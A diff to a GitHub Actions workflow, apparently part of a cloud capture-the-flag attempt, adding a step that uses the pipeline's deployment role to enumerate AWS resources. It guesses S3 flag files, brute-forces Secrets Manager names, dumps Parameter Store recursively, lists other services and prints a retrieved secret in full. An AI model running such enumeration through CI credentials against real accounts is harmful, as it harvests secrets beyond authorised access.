@@ -355,8 +355,151 @@ jobs:
           echo "--- Parameter Store ---"
           aws ssm get-parameters-by-path --path "/" --recursive 2>/dev/null || echo "No parameter store access"
           
-        else
-          echo ""
-          echo "❌ No elevated role assumption succeeded"
-          echo "Current permissions are limited to the github-deployment-role via OIDC"
-        fi
+    - name: Comprehensive search with current permissions
+      run: |
+        echo "=== COMPREHENSIVE SEARCH WITH CURRENT PERMISSIONS ==="
+        echo "Current identity: $(aws sts get-caller-identity --query Arn --output text)"
+        echo ""
+        
+        # Maybe the flag is accessible with our current github-deployment-role permissions
+        echo "=== S3 EXPLORATION ==="
+        
+        # List all S3 buckets we can see
+        echo "Available S3 buckets:"
+        aws s3 ls 2>/dev/null || echo "No S3 list access"
+        
+        # Try to access the original bucket in different ways
+        echo ""
+        echo "=== Original bucket comprehensive check ==="
+        BUCKET="atr3404-63428fb6"
+        echo "Bucket: $BUCKET"
+        
+        # Try different access patterns
+        echo "1. List bucket root:"
+        aws s3 ls s3://$BUCKET/ 2>/dev/null || echo "Cannot list root"
+        
+        echo "2. List with recursive:"
+        aws s3 ls s3://$BUCKET/ --recursive 2>/dev/null || echo "Cannot list recursive"
+        
+        echo "3. Try to get specific files that might exist:"
+        aws s3 cp s3://$BUCKET/flag.txt - 2>/dev/null && echo "" || echo "No flag.txt"
+        aws s3 cp s3://$BUCKET/flag - 2>/dev/null && echo "" || echo "No flag"
+        aws s3 cp s3://$BUCKET/FLAG - 2>/dev/null && echo "" || echo "No FLAG"
+        aws s3 cp s3://$BUCKET/flag.json - 2>/dev/null && echo "" || echo "No flag.json"
+        aws s3 cp s3://$BUCKET/secret.txt - 2>/dev/null && echo "" || echo "No secret.txt"
+        
+        echo "4. Try common file extensions:"
+        aws s3 cp s3://$BUCKET/flag.html - 2>/dev/null && echo "" || echo "No flag.html"
+        aws s3 cp s3://$BUCKET/secret.html - 2>/dev/null && echo "" || echo "No secret.html"
+        aws s3 cp s3://$BUCKET/admin.html - 2>/dev/null && echo "" || echo "No admin.html"
+        aws s3 cp s3://$BUCKET/private.html - 2>/dev/null && echo "" || echo "No private.html"
+        
+        echo "5. Try directories:"
+        aws s3 ls s3://$BUCKET/admin/ 2>/dev/null || echo "No admin/ directory"
+        aws s3 ls s3://$BUCKET/private/ 2>/dev/null || echo "No private/ directory"
+        aws s3 ls s3://$BUCKET/secret/ 2>/dev/null || echo "No secret/ directory"
+        aws s3 ls s3://$BUCKET/flag/ 2>/dev/null || echo "No flag/ directory"
+        aws s3 ls s3://$BUCKET/internal/ 2>/dev/null || echo "No internal/ directory"
+        
+        echo ""
+        echo "=== SECRETS MANAGER EXPLORATION ==="
+        
+        # Try to list secrets we might have access to
+        echo "Attempting to list secrets:"
+        aws secretsmanager list-secrets 2>/dev/null || echo "No list-secrets permission"
+        
+        # Try to access other potential secrets
+        echo ""
+        echo "Trying other potential secret names:"
+        POTENTIAL_SECRETS=(
+          "flag"
+          "ctf-flag"
+          "final-flag"
+          "hexnova404/flag"
+          "internal/flag"
+          "production/flag"
+          "admin/credentials"
+          "vault/flag"
+          "audit/flag"
+          "maintenance/flag"
+          "internal/secrets/flag"
+          "internal/secrets/final"
+          "internal/secrets/ctf"
+          "atr3404/flag"
+        )
+        
+        for secret in "${POTENTIAL_SECRETS[@]}"; do
+          echo "Trying secret: $secret"
+          aws secretsmanager get-secret-value --secret-id "$secret" --query SecretString --output text 2>/dev/null || echo "Cannot access $secret"
+        done
+        
+        echo ""
+        echo "=== PARAMETER STORE EXPLORATION ==="
+        
+        # Check if we can access Parameter Store
+        echo "Checking Parameter Store access:"
+        aws ssm describe-parameters 2>/dev/null || echo "No Parameter Store access"
+        
+        # Try to get parameters by path
+        echo "Trying parameter paths:"
+        aws ssm get-parameters-by-path --path "/" --recursive 2>/dev/null || echo "No parameter path access"
+        aws ssm get-parameters-by-path --path "/flag" --recursive 2>/dev/null || echo "No /flag path"
+        aws ssm get-parameters-by-path --path "/internal" --recursive 2>/dev/null || echo "No /internal path"
+        aws ssm get-parameters-by-path --path "/hexnova404" --recursive 2>/dev/null || echo "No /hexnova404 path"
+        
+        echo ""
+        echo "=== OTHER AWS SERVICES ==="
+        
+        # Check other services we might have access to
+        echo "Checking DynamoDB:"
+        aws dynamodb list-tables 2>/dev/null || echo "No DynamoDB access"
+        
+        echo "Checking Lambda:"
+        aws lambda list-functions 2>/dev/null || echo "No Lambda access"
+        
+        echo "Checking CloudFormation:"
+        aws cloudformation list-stacks 2>/dev/null || echo "No CloudFormation access"
+        
+        echo ""
+        echo "=== USING EXTERNAL_ID AS A CLUE ==="
+        
+        # Maybe the external_id itself contains the flag or is a clue
+        EXTERNAL_ID="extidHX9F3A1"
+        echo "External ID: $EXTERNAL_ID"
+        echo "Maybe the external_id contains encoded information?"
+        
+        # Try using parts of external_id as secret names
+        echo "Trying external_id components as secret names:"
+        aws secretsmanager get-secret-value --secret-id "$EXTERNAL_ID" --query SecretString --output text 2>/dev/null || echo "External_id is not a secret name"
+        aws secretsmanager get-secret-value --secret-id "HX9F3A1" --query SecretString --output text 2>/dev/null || echo "HX9F3A1 is not a secret name"
+        aws secretsmanager get-secret-value --secret-id "HX" --query SecretString --output text 2>/dev/null || echo "HX is not a secret name"
+        
+        echo ""
+        echo "=== FINAL ATTEMPT: CHECK IF FLAG IS IN CURRENT SECRET ==="
+        
+        # Maybe there's more in the secret we already accessed
+        echo "Re-examining the secret we can access:"
+        SECRET_VALUE=$(aws secretsmanager get-secret-value \
+          --secret-id "internal/secrets/id-v2" \
+          --query SecretString \
+          --output text)
+        
+        echo "Full secret value:"
+        echo "$SECRET_VALUE"
+        
+        # Check if there are other fields we missed
+        echo "Checking for other fields in the secret:"
+        echo "$SECRET_VALUE" | jq . 2>/dev/null || echo "Not valid JSON or already shown"
+        
+        # Maybe the flag is encoded in the external_id itself
+        echo ""
+        echo "=== DECODE ATTEMPTS ON EXTERNAL_ID ==="
+        echo "External ID: $EXTERNAL_ID"
+        
+        # Try decoding as base64
+        echo "Trying base64 decode:"
+        echo "$EXTERNAL_ID" | base64 -d 2>/dev/null || echo "Not base64"
+        
+        # Try hex decode
+        echo "Trying hex decode on numeric part (9F3A1):"
+        echo "9F3A1" | xxd -r -p 2>/dev/null || echo "Not hex"
